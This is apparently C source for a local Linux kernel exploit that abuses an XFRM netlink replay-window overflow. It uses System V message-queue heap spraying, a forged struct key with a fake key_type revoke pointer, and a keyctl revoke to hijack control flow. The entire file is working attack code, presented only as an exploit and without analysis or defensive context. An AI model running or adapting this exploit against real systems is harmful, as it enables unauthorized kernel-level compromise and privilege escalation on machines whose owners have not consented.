/*
 * 
 *  XFRM vulnerability + struct key
 * 
 * 
 */


#include <stdio.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <linux/in.h>
#include <linux/xfrm.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <strings.h>
#include <unistd.h>
#include <asm/unistd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stddef.h>
#include <sys/types.h>
#include <keyutils.h>
#include <sys/ipc.h>
#include <linux/keyctl.h>

#define MAX_PAYLOAD 4096
#define BUFF_SIZE  184
#define STRUCT_LEN_KEY (BUFF_SIZE - 0x30)
#define BASE_MSGTYPE 0x4141414141414141
#define NUM_MSG 9

struct msgbuf_key { 
	long mtype;
	char mtext[STRUCT_LEN_KEY];
};
struct msgbuf_key msg_key = {BASE_MSGTYPE, {0}};
int msqid;

struct ip_auth_hdr {
	__u8	nexthdr;
	__u8	hdrlen;
	__be16	reserved;	/* big endian */
	__be32	spi;		/* big endian */
	__be32	seq_no;		/* big endian */
	__u8	auth_data[8];
};




struct key_type {
    char * name;
    size_t datalen;
    void * vet_description;
    void * preparse;
    void * free_preparse;
    void * instantiate;
    void * update;
    void * match_preparse;
    void * match_free;
    void * revoke;
    void * destroy;
};
struct key_type my_key_type;

struct key_security_struct {
	unsigned int sid;	/* SID of key */
};
struct key_security_struct ksec;

void sendmymsg(int start, int num) {
	int i;
	size_t size;
	void *x;
    for (i = start; i < start+num; i++) {
    	msg_key.mtype = BASE_MSGTYPE + i;
		
    	if (i >= 64) {
    		perror("too much");
    		exit(1);
    	}
		//memset(msg_key.mtext, 0x42, STRUCT_LEN_KEY-1);
        if (msgsnd(msqid, &msg_key, sizeof(msg_key.mtext), 0) == -1) {
            perror("msgsnd");
            exit(1);
        }
    }
}

void recvmymsg(int index) {
	struct msgbuf_key msg_rcv;
	if (msgrcv(msqid, (void *) &msg_rcv, sizeof(msg_rcv.mtext), BASE_MSGTYPE+index,
				MSG_NOERROR | IPC_NOWAIT) == -1) {
		if(errno != ENOMSG) {
			perror("msgrcv");
			exit(1);
		}
	}
	else {
		//printf("message received: %s\n", msg.mtext);
	}
	return;
}

void fork_and_spray(int num) {
	int i;
	pid_t pid = -1;
	for (i = 0; i < num; i++) {
		pid = fork();
		if (pid == -1) {
			perror("fork");
			exit(0);
		}
		if (pid == 0) {
			if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
		        perror("msgget");
		        exit(1);
		    }

			// sleep(4);
			sendmymsg(0, 64);
			pause();
			//exit(0);
		}
	}
}

int init_xfrm_socket(){
	struct sockaddr_nl addr; 
	int result = -1,xfrm_socket;
	xfrm_socket = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (xfrm_socket<=0){
		perror("[-] bad NETLINK_XFRM socket ");
		return result;
	}
    addr.nl_family = PF_NETLINK;  
    addr.nl_pad    = 0;  
    addr.nl_pid    = getpid();  
    addr.nl_groups = 0;
    result = bind(xfrm_socket, (struct sockaddr *)&addr, sizeof(addr));
   	if (result<0){
		perror("[-] bad bind ");
		close(xfrm_socket);
		return result;
	} 
	return xfrm_socket;
}

int init_recvfd(){
	int recvfd=-1;
	recvfd= socket(AF_INET, SOCK_RAW, IPPROTO_AH );
	if (recvfd<=0){
		perror("[-] bad IPPROTO_AH socket ");
	}
	return recvfd;
}

int init_sendfd(){
	int sendfd=-1,err;	
	struct sockaddr_in addr;
	sendfd= socket(AF_INET, SOCK_RAW, IPPROTO_AH );
	if (sendfd<=0){
		perror("[-] bad IPPROTO_AH socket ");
		return -1;
	}
	memset(&addr,0,sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(0x4869);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	err = bind(sendfd, (struct sockaddr*)&addr,sizeof(addr));
	if (err<0){
		perror("[-] bad bind");
		return -1;		
	}
	return sendfd;
}

void dump_data(char *buf,size_t len){
	puts("=========================");
    int i ;
    for(i = 0;i<((len/8)*8);i+=8){
        printf("0x%lx",*(size_t *)(buf+i) );
        if (i%16)
            printf(" ");
        else
            printf("\n");
    }
}




int xfrm_add_sa(int sock,int spi,int bmp_len){
	struct sockaddr_nl nladdr;
	struct msghdr msg;
	struct nlmsghdr *nlhdr;
	struct iovec iov;
	int len = 4096,err;
	char *data;

	memset(&nladdr, 0, sizeof(nladdr));
	nladdr.nl_family = AF_NETLINK;
	nladdr.nl_pid = 0;
	nladdr.nl_groups = 0;
	nlhdr = (struct nlmsghdr *)malloc(NLMSG_SPACE(len));
	memset(nlhdr,0,NLMSG_SPACE(len));

	nlhdr->nlmsg_len = NLMSG_LENGTH(len);
	nlhdr->nlmsg_flags = NLM_F_REQUEST;
	nlhdr->nlmsg_pid = getpid();
	nlhdr->nlmsg_type = XFRM_MSG_NEWSA;

	data = NLMSG_DATA(nlhdr); 
	struct xfrm_usersa_info xui;
	memset(&xui,0,sizeof(xui));
	xui.family = AF_INET;
	xui.id.proto = IPPROTO_AH;
	xui.id.spi = spi;
	xui.id.daddr.a4 = inet_addr("127.0.0.1");
	xui.lft.hard_byte_limit = 0x10000000;
	xui.lft.hard_packet_limit = 0x10000000;
	xui.lft.soft_byte_limit = 0x1000;
	xui.lft.soft_packet_limit = 0x1000;
	xui.mode = XFRM_MODE_TRANSPORT;
	xui.flags = XFRM_STATE_ESN;
	memcpy(data,&xui,sizeof(xui));

	data += sizeof(xui);
	struct nlattr nla;
	struct xfrm_algo xa;
	memset(&nla, 0, sizeof(nla));
	memset(&xa, 0, sizeof(xa));
	nla.nla_len = sizeof(xa) + sizeof(nla);
	nla.nla_type = XFRMA_ALG_AUTH;
	strcpy(xa.alg_name, "digest_null");
	xa.alg_key_len = 0;
	memcpy(data, &nla, sizeof(nla));
	data += sizeof(nla);
	memcpy(data, &xa, sizeof(xa));
	data += sizeof(xa);

	struct xfrm_replay_state_esn rs;
	memset(&nla, 0, sizeof(nla));
	nla.nla_len =  sizeof(nla)+sizeof(rs) +bmp_len*8*4;
	nla.nla_type = XFRMA_REPLAY_ESN_VAL;	
	rs.replay_window = bmp_len;
	rs.bmp_len = bmp_len;
	memcpy(data,&nla,sizeof(nla));
	data += sizeof(nla);
	memcpy(data, &rs, sizeof(rs));
	data += sizeof(rs);	
	memset(data,'1',bmp_len*4*8);

	iov.iov_base = (void *)nlhdr;
	iov.iov_len = nlhdr->nlmsg_len;
	memset(&msg, 0, sizeof(msg));
	msg.msg_name = (void *)&(nladdr);
	msg.msg_namelen = sizeof(nladdr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
 	//dump_data(&msg,iov.iov_len);
	err = sendmsg (sock, &msg, 0); 
	if (err<0){
		perror("[-] bad sendmsg");
		return -1;		
	}
	return err;
}

int xfrm_new_ae(int sock,int spi,int bmp_len,int evil_windows,int seq,int seq_hi){
	struct sockaddr_nl nladdr;
	struct msghdr msg;
	struct nlmsghdr *nlhdr;
	struct iovec iov;
	int len = 4096,err;
	char *data;

	memset(&nladdr, 0, sizeof(nladdr));
	nladdr.nl_family = AF_NETLINK;
	nladdr.nl_pid = 0;
	nladdr.nl_groups = 0;
	nlhdr = (struct nlmsghdr *)malloc(NLMSG_SPACE(len));
	memset(nlhdr,0,NLMSG_SPACE(len));

	nlhdr->nlmsg_len = NLMSG_LENGTH(len);
	nlhdr->nlmsg_flags = NLM_F_REQUEST|NLM_F_REPLACE;
	nlhdr->nlmsg_pid = getpid();
	nlhdr->nlmsg_type = XFRM_MSG_NEWAE;

	data = NLMSG_DATA(nlhdr); 
	struct xfrm_aevent_id xai;
	memset(&xai,0,sizeof(xai));
	xai.sa_id.proto = IPPROTO_AH;
	xai.sa_id.family = AF_INET;
	xai.sa_id.spi = spi;
	xai.sa_id.daddr.a4 = inet_addr("127.0.0.1");

	memcpy(data,&xai,sizeof(xai));
	data += sizeof(xai);	

	struct nlattr nla;
	memset(&nla, 0, sizeof(nla));
	struct xfrm_replay_state_esn rs;
	memset(&nla, 0, sizeof(nla));
	nla.nla_len =  sizeof(nla)+sizeof(rs) +bmp_len*8*4;
	nla.nla_type = XFRMA_REPLAY_ESN_VAL;	
	rs.replay_window = evil_windows;
	rs.bmp_len = bmp_len;
	rs.seq_hi = seq_hi;
	rs.seq = seq;	
	memcpy(data,&nla,sizeof(nla));
	data += sizeof(nla);
	memcpy(data, &rs, sizeof(rs));
	data += sizeof(rs);	
	memset(data,'A',bmp_len*4*8);



	iov.iov_base = (void *)nlhdr;
	iov.iov_len = nlhdr->nlmsg_len;
	memset(&msg, 0, sizeof(msg));
	msg.msg_name = (void *)&(nladdr);
	msg.msg_namelen = sizeof(nladdr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	err = sendmsg (sock, &msg, 0); 
	if (err<0){
		perror("[-] bad sendmsg");
		return -1;		
	}
	return err;	
}

int sendah(int sock,int spi,int seq ){
	struct sockaddr_in sai;
	struct iovec iov;
	struct msghdr msg;
	char *data;
	struct ip_auth_hdr ah;
	int err;
	memset(&msg, 0, sizeof(msg));
	memset(&sai, 0, sizeof(sai));
	sai.sin_addr.s_addr = inet_addr("127.0.0.1");
	sai.sin_port = htons(0x4869);
	sai.sin_family = AF_INET;
	data = malloc(4096);
	memset(data,'1',4096);
	ah.spi = spi;
	ah.nexthdr = 1;
	ah.seq_no = seq;
	ah.hdrlen = (0x10 >> 2) - 2;

	memcpy(data,&ah,sizeof(ah));

	iov.iov_base = (void *)data;
	iov.iov_len = 4096;
	memset(&msg, 0, sizeof(msg));
	msg.msg_name = (void *)&(sai);
	msg.msg_namelen = sizeof(sai);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
 	//dump_data(&msg,iov.iov_len);
	//dump_data(nlhdr,iov.iov_len);
	err = sendmsg (sock, &msg, 0); 
	if (err<0){
		perror("[-] bad sendmsg");
		return -1;		
	}
	return err;	
}


int main(int argc, char const *argv[])
{
    int spi = 4869;
    if (argc > 1)
    {
        spi = atoi(argv[1]);
    }
	else
	{
		printf("usage: ./exp spi\neg: ./exp 4869\nchange spi everytime\n");
		return 0;
	}
	
	int spary_n=0xc00,err,xfrm_socket,recvfd,sendfd;
    
    int bmp_len  = (BUFF_SIZE - 0x18) / 4;
    int window = ((bmp_len + 2) * 32) + 1;
    int seq = 0xb40;
    int seq_hi = 1;
    
	ksec.sid = 1;
	*(unsigned long*)(&msg_key.mtext[32]) = &ksec;
    *(int*)(&msg_key.mtext[56]) = 0x3e8;
    *(int*)(&msg_key.mtext[72]) = 0x9;
    *(int*)(&msg_key.mtext[40]) = 0x0;
    //key->perm
    *(int*)(&msg_key.mtext[64]) = 0x3f3f3f3f;
    //*(unsigned long*)(&msg_key.mtext[0x78-0x30])=1;
	my_key_type.revoke = 0xdeadbeefcafebabe;
	*(unsigned long*)(&msg_key.mtext[0x80-0x30]) = &my_key_type;
    
	unsigned int time = 1;
	xfrm_socket=init_xfrm_socket();
	if (xfrm_socket<0){
		fprintf(stderr, "[-] bad init xfrm socket\n");
		exit(-1);
	}
	fprintf(stderr, "[+] init xfrm_socket %d \n",xfrm_socket);

	recvfd = init_recvfd();
	if (recvfd<0){
		fprintf(stderr, "[-] bad init_recvfd\n");
		exit(-1);
	}
	fprintf(stderr, "[+] init recvfd : %d \n",recvfd);
	sendfd = init_sendfd();
	if (recvfd<0){
		fprintf(stderr, "[-] bad sendfd\n");
		exit(-1);
	}
	fprintf(stderr, "[+] init sendfd : %d \n",sendfd);
	//return 0;
	fprintf(stderr, "[+] start spary msg \n");
	fork_and_spray(5);
	sleep(5);
	
	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }
    sendmymsg(0, NUM_MSG);
	recvmymsg(NUM_MSG - 2);
	recvmymsg(NUM_MSG - 8);

	err=xfrm_add_sa(xfrm_socket,spi,bmp_len);
	if (err<0){
		fprintf(stderr, "[-] bad xfrm_add_sa\n");
		exit(-1);
	}
	fprintf(stderr, "[+] xfrm_add_sa : %d \n",err);

	err=xfrm_new_ae(xfrm_socket,spi,bmp_len,window,seq,seq_hi);	
	if (err<0){
		fprintf(stderr, "[-] bad xfrm_new_ae\n");
		exit(-1);
	}
	fprintf(stderr, "[+] xfrm_new_ae : %d \n",err);	
    
	recvmymsg(NUM_MSG - 1);
	recvmymsg(NUM_MSG - 3);

    key_serial_t serial;
	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "keyring");
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }
    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
        perror("keyctl");
        return -1;
    }

	sendah(sendfd,spi, htonl(0x1743));
	
	serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, "keyring");
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }
	sleep(3);

	//sendmymsg(NUM_MSG, 64-NUM_MSG);
	sendmymsg(NUM_MSG, 64-NUM_MSG);
	if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
        perror("keyctl_revoke");
    }
}
